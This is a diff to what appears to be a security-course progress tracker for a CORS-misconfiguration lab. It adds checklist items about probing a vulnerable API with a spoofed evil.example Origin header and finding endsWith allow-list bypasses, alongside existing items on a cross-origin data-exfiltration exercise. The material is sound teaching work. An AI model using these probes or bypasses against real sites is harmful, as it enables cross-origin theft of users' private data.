-    tracker: ["Stood up cors-victim.js + cors-attacker.html and exfiltrated private data cross-origin", "Fixed it with an exact-origin allow-list and confirmed the read is blocked", "Read the Flask + flask-cors dual-language version (including the anchored-regex pitfall)", "Can explain why * and credentials cannot mix", "Can explain why CORS is not authorization", "Wrote the Phase 2 deliverable journal entry", "Answered the knowledge check"]
+    tracker: ["Stood up cors-victim.js + cors-attacker.html and exfiltrated private data cross-origin", "Fixed it with an exact-origin allow-list and confirmed the read is blocked", "Read the Flask + flask-cors dual-language version (including the anchored-regex pitfall)", "Can explain why * and credentials cannot mix", "Can explain why CORS is not authorization", "Wrote the Phase 2 deliverable journal entry", "Answered the knowledge check", "Workbench: used curl -H Origin to watch the vulnerable API reflect evil.example into ACAO with credentials", "Workbench: proved the allow-list discriminates, found two endsWith bypasses, and rebutted 'CORS protects my API'"]
   },
 
   // ============== PHASE 3 ==============
